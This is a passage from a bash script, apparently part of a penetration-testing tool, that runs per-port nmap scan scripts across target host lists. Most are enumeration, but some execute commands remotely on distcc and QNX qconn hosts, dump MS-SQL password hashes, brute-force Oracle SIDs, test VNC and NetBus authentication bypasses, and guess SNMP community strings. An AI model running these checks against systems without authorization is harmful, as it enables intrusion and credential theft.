\"$NAME\"/script-524.txt\nfi\n\nif [ -f \"$NAME\"/548.txt ]; then\n    echo \"    AFP\"\n    nmap --randomize-hosts -iL \"$NAME\"/548.txt -Pn -n --open -p548 -sT --script-timeout 20s --script=afp-ls,afp-path-vuln,afp-serverinfo,afp-showmount --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-548.txt\nfi\n\nif [ -f \"$NAME\"/554.txt ]; then\n    echo \"    RTSP\"\n    nmap --randomize-hosts -iL \"$NAME\"/554.txt -Pn -n --open -p554 -sT --script-timeout 20s --script=rtsp-methods --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-554.txt\nfi\n\nif [ -f \"$NAME\"/623.txt ]; then\n    echo \"    IPMI\"\n    nmap --randomize-hosts -iL \"$NAME\"/623.txt -Pn -n --open -p623 -sU --script-timeout 20s --script=ipmi-version,ipmi-cipher-zero --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-623.txt\nfi\n\nif [ -f \"$NAME\"/631.txt ]; then\n    echo \"    CUPS\"\n    nmap --randomize-hosts -iL \"$NAME\"/631.txt -Pn -n --open -p631 -sT --script-timeout 20s --script=cups-info,cups-queue-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-631.txt\nfi\n\nif [ -f \"$NAME\"/636.txt ]; then\n    echo \"    LDAP/S\"\n    nmap --randomize-hosts -iL \"$NAME\"/636.txt -Pn -n --open -p636 -sT --script-timeout 20s --script=ldap-rootdse,ssl-cert,ssl-cert-intaddr,ssl-ccs-injection,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-heartbleed,ssl-known-key,ssl-poodle,sslv2,sslv2-drown,tls-nextprotoneg -sV --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-636.txt\nfi\n\nif [ -f \"$NAME\"/873.txt ]; then\n    echo \"    rsync\"\n    nmap --randomize-hosts -iL \"$NAME\"/873.txt -Pn -n --open -p873 -sT --script-timeout 20s --script=rsync-list-modules --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-873.txt\nfi\n\nif [ -f \"$NAME\"/993.txt ]; then\n    echo \"    IMAP/S\"\n    nmap --randomize-hosts -iL \"$NAME\"/993.txt -Pn -n --open -p993 -sT --script-timeout 20s --script=banner,imap-capabilities,imap-ntlm-info,ssl-cert,ssl-cert-intaddr,ssl-ccs-injection,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-heartbleed,ssl-known-key,ssl-poodle,sslv2,sslv2-drown,tls-nextprotoneg -sV --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-993.txt\nfi\n\nif [ -f \"$NAME\"/995.txt ]; then\n    echo \"    POP3/S\"\n    nmap --randomize-hosts -iL \"$NAME\"/995.txt -Pn -n --open -p995 -sT --script-timeout 20s --script=banner,pop3-capabilities,pop3-ntlm-info,ssl-cert,ssl-cert-intaddr,ssl-ccs-injection,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-heartbleed,ssl-known-key,ssl-poodle,sslv2,sslv2-drown,tls-nextprotoneg -sV --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-995.txt\nfi\n\nif [ -f \"$NAME\"/1050.txt ]; then\n    echo \"    COBRA\"\n    nmap --randomize-hosts -iL \"$NAME\"/1050.txt -Pn -n --open -p1050 -sT --script-timeout 20s --script=giop-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1050.txt\nfi\n\nif [ -f \"$NAME\"/1080.txt ]; then\n    echo \"    SOCKS\"\n    nmap --randomize-hosts -iL \"$NAME\"/1080.txt -Pn -n --open -p1080 -sT --script-timeout 20s --script=socks-auth-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1080.txt\nfi\n\nif [ -f \"$NAME\"/1099.txt ]; then\n    echo \"    RMI Registry\"\n    nmap --randomize-hosts -iL \"$NAME\"/1099.txt -Pn -n --open -p1099 -sT --script-timeout 20s --script=rmi-dumpregistry,rmi-vuln-classloader --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1099.txt\nfi\n\nif [ -f \"$NAME\"/1344.txt ]; then\n    echo \"    ICAP\"\n    nmap --randomize-hosts -iL \"$NAME\"/1344.txt -Pn -n --open -p1344 -sT --script-timeout 20s --script=icap-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1344.txt\nfi\n\nif [ -f \"$NAME\"/1352.txt ]; then\n    echo \"    Lotus Domino\"\n    nmap --randomize-hosts -iL \"$NAME\"/1352.txt -Pn -n --open -p1352 -sT --script-timeout 20s --script=domino-enum-users --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1352.txt\nfi\n\nif [ -f \"$NAME\"/1433.txt ]; then\n    echo \"    MS-SQL\"\n    nmap --randomize-hosts -iL \"$NAME\"/1433.txt -Pn -n --open -p1433 -sT --script-timeout 20s --script=ms-sql-config,ms-sql-dac,ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-info,ms-sql-ntlm-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1433.txt\nfi\n\nif [ -f \"$NAME\"/1434.txt ]; then\n    echo \"    MS-SQL UDP\"\n    nmap --randomize-hosts -iL \"$NAME\"/1434.txt -Pn -n --open -p1434 -sU --script-timeout 20s --script=ms-sql-dac --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1434.txt\nfi\n\nif [ -f \"$NAME\"/1521.txt ]; then\n    echo \"    Oracle\"\n    nmap --randomize-hosts -iL \"$NAME\"/1521.txt -Pn -n --open -p1521 -sT --script-timeout 20s --script=oracle-tns-version,oracle-sid-brute --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1521.txt\nfi\n\nif [ -f \"$NAME\"/1604.txt ]; then\n    echo \"    Citrix\"\n    nmap --randomize-hosts -iL \"$NAME\"/1604.txt -Pn -n --open -p1604 -sU --script-timeout 20s --script=citrix-enum-apps,citrix-enum-servers --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1604.txt\nfi\n\nif [ -f \"$NAME\"/1723.txt ]; then\n    echo \"    PPTP\"\n    nmap --randomize-hosts -iL \"$NAME\"/1723.txt -Pn -n --open -p1723 -sT --script-timeout 20s --script=pptp-version --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1723.txt\nfi\n\nif [ -f \"$NAME\"/1883.txt ]; then\n    echo \"    MQTT\"\n    nmap --randomize-hosts -iL \"$NAME\"/1883.txt -Pn -n --open -p1883 -sT --script-timeout 20s --script=mqtt-subscribe --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1883.txt\nfi\n\nif [ -f \"$NAME\"/1911.txt ]; then\n    echo \"    Tridium Niagara Fox\"\n    nmap --randomize-hosts -iL \"$NAME\"/1911.txt -Pn -n --open -p1911 -sT --script-timeout 20s --script=fox-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1911.txt\nfi\n\nif [ -f \"$NAME\"/1962.txt ]; then\n    echo \"    PCWorx\"\n    nmap --randomize-hosts -iL \"$NAME\"/1962.txt -Pn -n --open -p1962 -sT --script-timeout 20s --script=pcworx-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-1962.txt\nfi\n\nif [ -f \"$NAME\"/2049.txt ]; then\n    echo \"    NFS\"\n    nmap --randomize-hosts -iL \"$NAME\"/2049.txt -Pn -n --open -p2049 -sT --script-timeout 20s --script=nfs-ls,nfs-showmount,nfs-statfs --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-2049.txt\nfi\n\nif [ -f \"$NAME\"/2202.txt ]; then\n    echo \"    ACARS\"\n    nmap --randomize-hosts -iL \"$NAME\"/2202.txt -Pn -n --open -p2202 -sT --script-timeout 20s --script=acarsd-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-2202.txt\nfi\n\nif [ -f \"$NAME\"/2302.txt ]; then\n    echo \"    Freelancer\"\n    nmap --randomize-hosts -iL \"$NAME\"/2302.txt -Pn -n --open -p2302 -sU --script-timeout 20s --script=freelancer-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-2302.txt\nfi\n\nif [ -f \"$NAME\"/2375.txt ]; then\n    echo \"    Docker\"\n    nmap --randomize-hosts -iL \"$NAME\"/2375.txt -Pn -n --open -p2375 -sT --script-timeout 20s --script=docker-version --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-2375.txt\nfi\n\nif [ -f \"$NAME\"/2628.txt ]; then\n    echo \"    DICT\"\n    nmap --randomize-hosts -iL \"$NAME\"/2628.txt -Pn -n --open -p2628 -sT --script-timeout 20s --script=dict-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-2628.txt\nfi\n\nif [ -f \"$NAME\"/2947.txt ]; then\n    echo \"    GPS\"\n    nmap --randomize-hosts -iL \"$NAME\"/2947.txt -Pn -n --open -p2947 -sT --script-timeout 20s --script=gpsd-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-2947.txt\nfi\n\nif [ -f \"$NAME\"/3031.txt ]; then\n    echo \"    Apple Remote Event\"\n    nmap --randomize-hosts -iL \"$NAME\"/3031.txt -Pn -n --open -p3031 -sT --script-timeout 20s --script=eppc-enum-processes --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-3031.txt\nfi\n\nif [ -f \"$NAME\"/3260.txt ]; then\n    echo \"    iSCSI\"\n    nmap --randomize-hosts -iL \"$NAME\"/3260.txt -Pn -n --open -p3260 -sT --script-timeout 20s --script=iscsi-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-3260.txt\nfi\n\nif [ -f \"$NAME\"/3306.txt ]; then\n    echo \"    MySQL\"\n    nmap --randomize-hosts -iL \"$NAME\"/3306.txt -Pn -n --open -p3306 -sT --script-timeout 20s --script=mysql-databases,mysql-empty-password,mysql-info,mysql-users,mysql-variables --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-3306.txt\nfi\n\nif [ -f \"$NAME\"/3310.txt ]; then\n    echo \"    ClamAV\"\n    nmap --randomize-hosts -iL \"$NAME\"/3310.txt -Pn -n --open -p3310 -sT --script-timeout 20s --script=clamav-exec --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-3310.txt\nfi\n\nif [ -f \"$NAME\"/3389.txt ]; then\n    echo \"    Remote Desktop\"\n    nmap --randomize-hosts -iL \"$NAME\"/3389.txt -Pn -n --open -p3389 -sT --script-timeout 20s --script=rdp-vuln-ms12-020,rdp-enum-encryption,rdp-ntlm-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    grep -Eiv '(attackers|description|disclosure|http|references|risk factor)' tmp4 > \"$NAME\"/script-3389.txt\nfi\n\nif [ -f \"$NAME\"/3478.txt ]; then\n    echo \"    STUN\"\n    nmap --randomize-hosts -iL \"$NAME\"/3478.txt -Pn -n --open -p3478 -sU --script-timeout 20s --script=stun-version --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-3478.txt\nfi\n\nif [ -f \"$NAME\"/3632.txt ]; then\n    echo \"    Distributed Compiler Daemon\"\n    nmap --randomize-hosts -iL \"$NAME\"/3632.txt -Pn -n --open -p3632 -sT --script-timeout 20s --script=distcc-cve2004-2687 --script-args=\"distcc-exec.cmd='id'\" --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    grep -Eiv '(allows|description|disclosure|earlier|extra|http|ids|references|risk factor)' tmp4 > \"$NAME\"/script-3632.txt\nfi\n\nif [ -f \"$NAME\"/3671.txt ]; then\n    echo \"    KNX gateway\"\n    nmap --randomize-hosts -iL \"$NAME\"/3671.txt -Pn -n --open -p3671 -sU --script-timeout 20s --script=knx-gateway-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-3671.txt\nfi\n\nif [ -f \"$NAME\"/4369.txt ]; then\n    echo \"    Erlang Port Mapper\"\n    nmap --randomize-hosts -iL \"$NAME\"/4369.txt -Pn -n --open -p4369 -sT --script-timeout 20s --script=epmd-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-4369.txt\nfi\n\nif [ -f \"$NAME\"/5019.txt ]; then\n    echo \"    Versant\"\n    nmap --randomize-hosts -iL \"$NAME\"/5019.txt -Pn -n --open -p5019 -sT --script-timeout 20s --script=versant-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-5019.txt\nfi\n\nif [ -f \"$NAME\"/5060.txt ]; then\n    echo \"    SIP\"\n    nmap --randomize-hosts -iL \"$NAME\"/5060.txt -Pn -n --open -p5060 -sT --script-timeout 20s --script=sip-enum-users,sip-methods --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-5060.txt\nfi\n\nif [ -f \"$NAME\"/5353.txt ]; then\n    echo \"    DNS Service Discovery\"\n    nmap --randomize-hosts -iL \"$NAME\"/5353.txt -Pn -n --open -p5353 -sU --script-timeout 20s --script=dns-service-discovery --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-5353.txt\nfi\n\nif [ -f \"$NAME\"/5666.txt ]; then\n    echo \"    Nagios\"\n    nmap --randomize-hosts -iL \"$NAME\"/5666.txt -Pn -n --open -p5666 -sT --script-timeout 20s --script=nrpe-enum --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-5666.txt\nfi\n\nif [ -f \"$NAME\"/5672.txt ]; then\n    echo \"    AMQP\"\n    nmap --randomize-hosts -iL \"$NAME\"/5672.txt -Pn -n --open -p5672 -sT --script-timeout 20s --script=amqp-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-5672.txt\nfi\n\nif [ -f \"$NAME\"/5683.txt ]; then\n    echo \"    CoAP\"\n    nmap --randomize-hosts -iL \"$NAME\"/5683.txt -Pn -n --open -p5683 -sU --script-timeout 20s --script=coap-resources --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-5683.txt\nfi\n\nif [ -f \"$NAME\"/5850.txt ]; then\n    echo \"    OpenLookup\"\n    nmap --randomize-hosts -iL \"$NAME\"/5850.txt -Pn -n --open -p5850 -sT --script-timeout 20s --script=openlookup-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-5850.txt\nfi\n\nif [ -f \"$NAME\"/5900.txt ]; then\n    echo \"    VNC\"\n    nmap --randomize-hosts -iL \"$NAME\"/5900.txt -Pn -n --open -p5900 -sT --script-timeout 20s --script=realvnc-auth-bypass,vnc-info,vnc-title --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-5900.txt\nfi\n\nif [ -f \"$NAME\"/5984.txt ]; then\n    echo \"    CouchDB\"\n    nmap --randomize-hosts -iL \"$NAME\"/5984.txt -Pn -n --open -p5984 -sT --script-timeout 20s --script=couchdb-databases,couchdb-stats --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-5984.txt\nfi\n\nif [ -f \"$NAME\"/x11.txt ]; then\n    echo \"    X11\"\n    nmap --randomize-hosts -iL \"$NAME\"/x11.txt -Pn -n --open -p6000-6005 -sT --script-timeout 20s --script=x11-access --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-x11.txt\nfi\n\nif [ -f \"$NAME\"/6379.txt ]; then\n    echo \"    Redis\"\n    nmap --randomize-hosts -iL \"$NAME\"/6379.txt -Pn -n --open -p6379 -sT --script-timeout 20s --script=redis-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-6379.txt\nfi\n\nif [ -f \"$NAME\"/6481.txt ]; then\n    echo \"    Sun Service Tags\"\n    nmap --randomize-hosts -iL \"$NAME\"/6481.txt -Pn -n --open -p6481 -sU --script-timeout 20s --script=servicetags --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-6481.txt\nfi\n\nif [ -f \"$NAME\"/6666.txt ]; then\n    echo \"    Voldemort\"\n    nmap --randomize-hosts -iL \"$NAME\"/6666.txt -Pn -n --open -p6666 -sT --script-timeout 20s --script=voldemort-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-6666.txt\nfi\n\nif [ -f \"$NAME\"/7210.txt ]; then\n    echo \"    Max DB\"\n    nmap --randomize-hosts -iL \"$NAME\"/7210.txt -Pn -n --open -p7210 -sT --script-timeout 20s --script=maxdb-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-7210.txt\nfi\n\nif [ -f \"$NAME\"/7634.txt ]; then\n    echo \"    Hard Disk Info\"\n    nmap --randomize-hosts -iL \"$NAME\"/7634.txt -Pn -n --open -p7634 -sT --script-timeout 20s --script=hddtemp-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-7634.txt\nfi\n\nif [ -f \"$NAME\"/8000.txt ]; then\n    echo \"    QNX QCONN\"\n    nmap --randomize-hosts -iL \"$NAME\"/8000.txt -Pn -n --open -p8000 -sT --script-timeout 20s --script=qconn-exec --script-args=qconn-exec.timeout=60,qconn-exec.bytes=1024,qconn-exec.cmd=\"uname -a\" --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-8000.txt\nfi\n\nif [ -f \"$NAME\"/8009.txt ]; then\n    echo \"    AJP\"\n    nmap --randomize-hosts -iL \"$NAME\"/8009.txt -Pn -n --open -p8009 -sT --script-timeout 20s --script=ajp-methods,ajp-request --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-8009.txt\nfi\n\nif [ -f \"$NAME\"/8081.txt ]; then\n    echo \"    McAfee ePO\"\n    nmap --randomize-hosts -iL \"$NAME\"/8081.txt -Pn -n --open -p8081 -sT --script-timeout 20s --script=mcafee-epo-agent --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-8081.txt\nfi\n\nif [ -f \"$NAME\"/8091.txt ]; then\n    echo \"    CouchBase Web Administration\"\n    nmap --randomize-hosts -iL \"$NAME\"/8091.txt -Pn -n --open -p8091 -sT --script-timeout 20s --script=membase-http-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-8091.txt\nfi\n\nif [ -f \"$NAME\"/8140.txt ]; then\n    echo \"    Puppet\"\n    nmap --randomize-hosts -iL \"$NAME\"/8140.txt -Pn -n --open -p8140 -sT --script-timeout 20s --script=puppet-naivesigning --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-8140.txt\nfi\n\nif [ -f \"$NAME\"/bitcoin.txt ]; then\n    echo \"    Bitcoin\"\n    nmap --randomize-hosts -iL \"$NAME\"/bitcoin.txt -Pn -n --open -p8332,8333 -sT --script-timeout 20s --script=bitcoin-getaddr,bitcoin-info,bitcoinrpc-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-bitcoin.txt\nfi\n\nif [ -f \"$NAME\"/9100.txt ]; then\n    echo \"    Lexmark\"\n    nmap --randomize-hosts -iL \"$NAME\"/9100.txt -Pn -n --open -p9100 -sT --script-timeout 20s --script=lexmark-config --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-9100.txt\nfi\n\nif [ -f \"$NAME\"/9160.txt ]; then\n    echo \"    Cassandra\"\n    nmap --randomize-hosts -iL \"$NAME\"/9160.txt -Pn -n --open -p9160 -sT --script-timeout 20s --script=cassandra-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-9160.txt\nfi\n\nif [ -f \"$NAME\"/9600.txt ]; then\n    echo \"    FINS\"\n    nmap --randomize-hosts -iL \"$NAME\"/9600.txt -Pn -n --open -p9600 -sT --script-timeout 20s --script=omron-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-9600.txt\nfi\n\nif [ -f \"$NAME\"/9999.txt ]; then\n    echo \"    Java Debug Wire Protocol\"\n    nmap --randomize-hosts -iL \"$NAME\"/9999.txt -Pn -n --open -p9999 -sT --script-timeout 20s --script=jdwp-version --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-9999.txt\nfi\n\nif [ -f \"$NAME\"/10000.txt ]; then\n    echo \"    Network Data Management\"\n    nmap --randomize-hosts -iL \"$NAME\"/10000.txt -Pn -n --open -p10000 -sT --script-timeout 20s --script=ndmp-fs-info,ndmp-version --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-10000.txt\nfi\n\n\nif [ -f \"$NAME\"/10809.txt ]; then\n    echo \"    Memory Object Caching\"\n    nmap --randomize-hosts -iL \"$NAME\"/10809.txt -Pn -n --open -p10809 -sT --script-timeout 20s --script=nbd-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-10809.txt\nfi\n\n\nif [ -f \"$NAME\"/11211.txt ]; then\n    echo \"    Memory Object Caching\"\n    nmap --randomize-hosts -iL \"$NAME\"/11211.txt -Pn -n --open -p11211 -sT --script-timeout 20s --script=memcached-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-11211.txt\nfi\n\nif [ -f \"$NAME\"/12000.txt ]; then\n    echo \"    CCcam\"\n    nmap --randomize-hosts -iL \"$NAME\"/12000.txt -Pn -n --open -p12000 -sT --script-timeout 20s --script=cccam-version --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-12000.txt\nfi\n\nif [ -f \"$NAME\"/12345.txt ]; then\n    echo \"    NetBus\"\n    nmap --randomize-hosts -iL \"$NAME\"/12345.txt -Pn -n --open -p12345 -sT --script-timeout 20s --script=netbus-auth-bypass,netbus-version --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-12345.txt\nfi\n\nif [ -f \"$NAME\"/17185.txt ]; then\n    echo \"    VxWorks\"\n    nmap --randomize-hosts -iL \"$NAME\"/17185.txt -Pn -n --open -p17185 -sU --script-timeout 20s --script=wdb-version --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-17185.txt\nfi\n\nif [ -f \"$NAME\"/19150.txt ]; then\n    echo \"    GKRellM\"\n    nmap --randomize-hosts -iL \"$NAME\"/19150.txt -Pn -n --open -p19150 -sT --script-timeout 20s --script=gkrellm-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-19150.txt\nfi\n\nif [ -f \"$NAME\"/27017.txt ]; then\n    echo \"    MongoDB\"\n    nmap --randomize-hosts -iL \"$NAME\"/27017.txt -Pn -n --open -p27017 -sT --script-timeout 20s --script=mongodb-databases,mongodb-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-27017.txt\nfi\n\nif [ -f \"$NAME\"/31337.txt ]; then\n    echo \"    BackOrifice\"\n    nmap --randomize-hosts -iL \"$NAME\"/31337.txt -Pn -n --open -p31337 -sU --script-timeout 20s --script=backorifice-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-31337.txt\nfi\n\nif [ -f \"$NAME\"/35871.txt ]; then\n    echo \"    Flume\"\n    nmap --randomize-hosts -iL \"$NAME\"/35871.txt -Pn -n --open -p35871 -sT --script-timeout 20s --script=flume-master-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-35871.txt\nfi\n\nif [ -f \"$NAME\"/44818.txt ]; then\n    echo \"    EtherNet/IP\"\n    nmap --randomize-hosts -iL \"$NAME\"/44818.txt -Pn -n --open -p44818 -sU --script-timeout 20s --script=enip-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-44818.txt\nfi\n\nif [ -f \"$NAME\"/47808.txt ]; then\n    echo \"    BACNet\"\n    nmap --randomize-hosts -iL \"$NAME\"/47808.txt -Pn -n --open -p47808 -sU --script-timeout 20s --script=bacnet-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-47808.txt\nfi\n\nif [ -f \"$NAME\"/49152.txt ]; then\n    echo \"    Supermicro\"\n    nmap --randomize-hosts -iL \"$NAME\"/49152.txt -Pn -n --open -p49152 -sT --script-timeout 20s --script=supermicro-ipmi-conf --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-49152.txt\nfi\n\nif [ -f \"$NAME\"/50000.txt ]; then\n    echo \"    DRDA\"\n    nmap --randomize-hosts -iL \"$NAME\"/50000.txt -Pn -n --open -p50000 -sT --script-timeout 20s --script=drda-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-50000.txt\nfi\n\nif [ -f \"$NAME\"/hadoop.txt ]; then\n    echo \"    Hadoop\"\n    nmap --randomize-hosts -iL \"$NAME\"/hadoop.txt -Pn -n --open -p50030,50060,50070,50075,50090 -sT --script-timeout 20s --script=hadoop-datanode-info,hadoop-jobtracker-info,hadoop-namenode-info,hadoop-secondary-namenode-info,hadoop-tasktracker-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-hadoop.txt\nfi\n\nif [ -f \"$NAME\"/apache-hbase.txt ]; then\n    echo \"    Apache HBase\"\n    nmap --randomize-hosts -iL \"$NAME\"/apache-hbase.txt -Pn -n --open -p60010,60030 -sT --script-timeout 20s --script=hbase-master-info,hbase-region-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-apache-hbase.txt\nfi\n\nrm tmp*\n\nfor x in \"$NAME\"/./script*; do\n    if grep '|' \"$x\" > /dev/null 2>&1; then\n        echo > /dev/null 2>&1\n    else\n        rm \"$x\" > /dev/null 2>&1\n    fi\ndone\n\n###############################################################################################################################\n\n# Additional tools\n\nif [ -f \"$NAME\"/161.txt ] || [ -f \"$NAME\"/445.txt ] || [ -f \"$NAME\"/500.txt ]; then\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo -e \"${BLUE}Running additional tools.${NC}\"\n\n    if [ -f \"$NAME\"/161.txt ]; then\n        echo \"    onesixtyone\"\n        onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i \"$NAME\"/161.txt | grep -v 'Scanning' > \"$NAME\"/script-onesixtyone.txt\n    fi\n\n    if [ -f \"$NAME\"/445.txt ]; then\n        echo \"    enum4linux\"\n        while read -r LINE; do\n            echo \"$LINE\" >> 